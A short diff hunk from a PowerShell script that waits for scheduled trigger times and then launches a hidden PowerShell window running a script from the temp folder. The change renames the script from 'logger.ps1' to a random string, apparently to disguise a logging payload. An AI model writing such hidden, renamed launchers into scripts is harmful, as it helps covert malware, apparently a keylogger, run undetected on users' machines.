@@ -34,7 +34,7 @@ $triggerTimes = @(
                     (Get-Date -Date $time) - (Get-Date) | Start-Sleep
                 }
 
-                Powershell Start-Process Powershell.exe -windowstyle hidden "$env:temp/logger.ps1"
+                Powershell Start-Process Powershell.exe -windowstyle hidden "$env:temp/XukhovfGQPLEcYwZ.ps1"
             }
         }
     }
